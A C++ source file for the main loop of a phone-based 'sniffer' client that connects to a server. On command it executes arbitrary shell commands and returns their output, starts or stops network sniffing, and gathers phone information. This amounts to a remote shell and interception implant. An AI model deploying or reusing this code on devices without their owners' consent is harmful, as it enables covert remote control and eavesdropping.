/*
 * SnifferMain.cpp
 *
 *  Created on: 2015-11-14
 *      Author: Max
 */

#include "SnifferMain.h"

SnifferMain::SnifferMain() {
	// TODO Auto-generated constructor stub

}

SnifferMain::~SnifferMain() {
	// TODO Auto-generated destructor stub
}

void SnifferMain::OnRecvCommand(SnifferClient* client, const SCMD &scmd) {
	switch(scmd.header.scmdt) {
	case ExcuteCommand:{
		// 执行Shell命令
		string cmd = scmd.param;
		string result = SystemComandExecuteWithResult(cmd);

		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 执行 : %s )", cmd.c_str());
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 执行结果 : %s )", result.c_str());

		// 返回命令结果
		SCMD scmdSend;
		scmdSend.header.scmdt = ExcuteCommandResult;
		scmdSend.header.bNew = false;
		scmdSend.header.seq = scmd.header.seq;
		scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
		memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
		scmdSend.param[scmdSend.header.len] = '\0';
		client->SendCommand(scmdSend);

	}break;
	case SinfferTypeStart:{
		// 开始监听
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 开始监听 )");
		mSniffer.StartSniffer();

	}break;
	case SinfferTypeStop:{
		// 停止监听
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 停止监听 )");
		mSniffer.StopSniffer();

	}break;
	case SinfferTypeVersion:{
		// 返回版本
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 返回版本号 : %s )", SnifferVersion);

		SCMD scmdSend;
		scmdSend.header.scmdt = SinfferTypeVersionResult;
		scmdSend.header.bNew = false;
		scmdSend.header.seq = scmd.header.seq;
		scmdSend.header.len = MIN(strlen(SnifferVersion), MAX_PARAM_LEN - 1);
		memcpy(scmdSend.param, SnifferVersion, scmdSend.header.len);
		scmdSend.param[scmdSend.header.len] = '\0';
		client->SendCommand(scmdSend);

	}break;
	case SinfferTypeNone:{
		// 与服务端连接已经断开

	}break;
	default:break;
	}
}

bool SnifferMain::Run() {
	FileLog(SnifferLogFileName, "SnifferMain::Run()");

	bool bFlag = false;

	// 获取手机信息
	GetPhoneInfo();

	mSnifferClient.SetSnifferClientCallback(this);
	bFlag = mSnifferClient.Start();

	FileLog(SnifferLogFileName, "SnifferMain::Run( bFlag : %s )", bFlag?"true":"false");

	return bFlag;
}
